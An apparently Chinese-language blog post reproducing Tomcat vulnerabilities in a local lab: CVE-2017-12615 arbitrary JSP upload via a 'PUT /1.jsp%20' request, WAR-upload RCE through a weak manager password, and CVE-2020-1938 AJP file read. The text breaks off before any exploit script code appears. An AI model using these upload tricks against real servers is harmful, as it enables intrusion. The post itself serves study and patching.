@@ -1,0 +1,1090 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    tomcat历史漏洞复现 |
+    
+    S@Ku_yA的blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="历史漏洞复现CVE-2017-12615 (PUT 方法任意文件上传)在tomcat的conf&#x2F;web.xml里面有一个参数readonly 根据注释可以知道这个参数就是开启是否接受delete和put请求 false就等于允许  我们在DefaultServlet中添加这个参数  复现本地启动tomcat 使用jpda这个javaagent 使得idea可以远程调试tomcat 1ca">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tomcat历史漏洞复现">
+<meta property="og:url" content="http://example.com/2026/03/20/tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="S@Ku_yA的blog">
+<meta property="og:description" content="历史漏洞复现CVE-2017-12615 (PUT 方法任意文件上传)在tomcat的conf&#x2F;web.xml里面有一个参数readonly 根据注释可以知道这个参数就是开启是否接受delete和put请求 false就等于允许  我们在DefaultServlet中添加这个参数  复现本地启动tomcat 使用jpda这个javaagent 使得idea可以远程调试tomcat 1ca">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414102706027.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414102837580.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414102611163.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414102933243.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414103055126.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414103117536.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414103249374.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414103402352.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414103558887.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414103636797.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414103706228.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414104041544.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414104104751.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414104612946.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414104650603.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414191841979.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414192156054.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414192208692.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414192246033.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414192304442.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414192322770.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414193040459.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415105123002.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415105148662.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415105510432.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415105543563.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415110341034.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415110537635.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415112844350.png">
+<meta property="og:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260415113016013.png">
+<meta property="article:published_time" content="2026-03-20T09:33:37.000Z">
+<meta property="article:modified_time" content="2026-05-12T07:38:47.485Z">
+<meta property="article:author" content="S@Ku_yA">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="e:\blog_back\source_posts\tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\image-20260414102706027.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css" integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr&#x2F;Io" crossorigin="anonymous">
+
+    
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+    
+  </nav>
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="tomcat历史漏洞复现">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">tomcat历史漏洞复现</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">历史漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-12615-PUT-%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">CVE-2017-12615 (PUT 方法任意文件上传)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#manager%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8Fwar%E5%8C%85%E4%B8%8A%E4%BC%A0rce"><span class="toc-number">3.</span> <span class="toc-text">manager弱口令导致任意war包上传rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1938-webapp-ROOT%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.</span> <span class="toc-text">CVE 2020-1938 (webapp&#x2F;ROOT下的任意文件读取)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">复现</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">43</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-tomcat历史漏洞复现" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-03-20T09:33:37.000Z" itemprop="datePublished">2026-03-20</time>
+    <time style="display: none;" id="post-update-time">2026-05-12</time>
+  </span>
+  
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Java%E5%AE%89%E5%85%A8/" title="Java安全">Java安全</a>
+  </div>
+
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="历史漏洞复现"><a href="#历史漏洞复现" class="headerlink" title="历史漏洞复现"></a>历史漏洞复现</h2><h2 id="CVE-2017-12615-PUT-方法任意文件上传"><a href="#CVE-2017-12615-PUT-方法任意文件上传" class="headerlink" title="CVE-2017-12615 (PUT 方法任意文件上传)"></a>CVE-2017-12615 (PUT 方法任意文件上传)</h2><p>在tomcat的conf&#x2F;web.xml里面有一个参数readonly 根据注释可以知道这个参数就是开启是否接受delete和put请求</p>
+<p>false就等于允许</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414102706027.png" alt="image-20260414102706027"></p>
+<p>我们在DefaultServlet中添加这个参数</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414102837580.png" alt="image-20260414102837580"></p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>本地启动tomcat 使用jpda这个javaagent 使得idea可以远程调试tomcat</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catalina.bat jpda start</span><br></pre></td></tr></table></figure>
+
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414102611163.png" alt="image-20260414102611163"></p>
+<p>在idea中打断点</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414102933243.png" alt="image-20260414102933243"></p>
+<p>bp发包</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414103055126.png" alt="image-20260414103055126"></p>
+<p>可以看到idea停在断点上了</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414103117536.png" alt="image-20260414103117536"></p>
+<p>一开始就判断readonly的值 因为为false所以跳过</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414103249374.png" alt="image-20260414103249374"></p>
+<p>后续就是获取路径path 然后判断是否存在文件</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414103402352.png" alt="image-20260414103402352"></p>
+<p>获取请求输入流 在通过请求输入流获取到请求体</p>
+<p>后面会进入到resources.bind(path, newResource)</p>
+<p>这里就是sink点</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414103558887.png" alt="image-20260414103558887"></p>
+<p>跟进dirContext.bind()</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414103636797.png" alt="image-20260414103636797"></p>
+<p>继续跟进</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414103706228.png" alt="image-20260414103706228"></p>
+<p>来到FileDirContext的bind方法中</p>
+<p>创建一个File对象 然后判断是否存在 </p>
+<p>继续跟进下面的rebind()</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414104041544.png" alt="image-20260414104041544"></p>
+<p>前面是一些判断语句</p>
+<p>也是创建一个file对象 判断obj对象类型</p>
+<p>因为obj对象是resource类 所以is获取obj的请求体数据</p>
+<p> 重点在后面</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414104104751.png" alt="image-20260414104104751"></p>
+<p>创建一个FileOutputStream os 然后将file对象传入FileOutputStream 中</p>
+<p>用上面的输入流is读取数据 </p>
+<p>最后os在写入file对象中 此时文件就成功写入了</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414104612946.png" alt="image-20260414104612946"></p>
+<p>可以成功访问</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414104650603.png" alt="image-20260414104650603"></p>
+<p>在发送数据包的时候发的是</p>
+<p>PUT &#x2F;1.jsp%20</p>
+<p>如果不加%20 他会使用jsp的Servlet 所以需要加入空格的url编码 使得是DefaultServlet去处理这个请求</p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>不要使用readonly参数 默认也没有使用</p>
+<h2 id="manager弱口令导致任意war包上传rce"><a href="#manager弱口令导致任意war包上传rce" class="headerlink" title="manager弱口令导致任意war包上传rce"></a>manager弱口令导致任意war包上传rce</h2><p>在conf&#x2F;tomcat-user.xml中 写入这些用户配置 即可打开&#x2F;manager</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414191841979.png" alt="image-20260414191841979"></p>
+<p>如果在配置的时候 配置了弱密码就可能有rce风险</p>
+<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414192156054.png" alt="image-20260414192156054"></p>
+<p>输入账号密码</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414192208692.png" alt="image-20260414192208692"></p>
+<p>有一个可以上传war包的地方</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414192246033.png" alt="image-20260414192246033"></p>
+<p>上传war包</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414192304442.png" alt="image-20260414192304442"></p>
+<p>显示ok就可以了</p>
+<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/3/3.jsp">http://127.0.0.1:8080/3/3.jsp</a></p>
+<p>我们war包名为3 他就会在webapp里面创建一个3的目录夹 并且有3.jsp</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414192322770.png" alt="image-20260414192322770"></p>
+<h2 id="CVE-2020-1938-webapp-ROOT下的任意文件读取"><a href="#CVE-2020-1938-webapp-ROOT下的任意文件读取" class="headerlink" title="CVE 2020-1938 (webapp&#x2F;ROOT下的任意文件读取)"></a>CVE 2020-1938 (webapp&#x2F;ROOT下的任意文件读取)</h2><p>ajp协议是用于Web服务器与Servlet容器间的高效通信 ajp用来请求一些资源 并且传输二进制数据 效率比http协议高 </p>
+<p>一般情况下客户端没法直接使用ajp协议去访问tomcat 一般都是走http</p>
+<p>ajp协议并没有做一些权限控制 导致只需要构造一些恶意的请求 tomcat就会返回数据</p>
+<p>ajp协议在tomcat中默认启动在8009端口上</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260414193040459.png" alt="image-20260414193040459"></p>
+<p>主要的触发方式是通过构造指定的数据包 <strong>触发指定资源的请求</strong> 依此读取文件</p>
+<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>使用exp脚本来触发漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span 